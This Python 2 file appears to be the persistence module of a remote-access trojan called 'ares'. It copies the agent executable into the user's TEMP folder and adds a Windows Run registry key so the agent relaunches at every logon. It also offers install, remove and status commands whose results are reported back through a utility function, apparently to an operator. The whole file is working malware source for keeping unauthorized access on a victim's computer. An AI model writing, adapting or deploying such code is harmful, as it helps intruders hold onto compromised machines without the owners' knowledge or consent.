import sys
import subprocess
import shutil
import requests
import os

import utils


SERVICE_NAME= "ares"

if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''
EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)


def install():
    if not is_installed():
        try:
            stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
            shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)
        except Exception as e:
            utils.send_output("Persistence: failed to install the agent: %s." % (e))

def clean():
    stdin, stdout, stderr = os.popen3("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME)
    error = stderr.read()
    if error:
        return False
        
    stdin, stdout, stderr = os.popen3(
        "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""))
    error = stderr.read()
    if error:
        return False
    return True

def is_installed():
    stdin, stdout, stderr = os.popen3("reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
    error = stderr.read()
    if error:
        utils.send_output("Persistence: failed to run command to install in registry: %s." % (error))
        return True
    if SERVICE_NAME in stdout.read():
        return True
    else:
        return False

def run(action = None):
    if action == None:
        print "Pesistence module run needs one parameter."
    if action == "install":
        install()
        utils.send_output("Persistence installed.")
    elif action == "remove":
        if clean():
            utils.send_output("Persistence removed.")
        else:
            utils.send_output("Persistence could not be removed.")
    elif action == "status":
        if is_installed():
            utils.send_output("Persistence is ON.")
        else:
            utils.send_output("Persistence is OFF.")


def help():
    help_text = """
Usage: persistence install|remove|status
Manages persistence.

"""
    return help_text
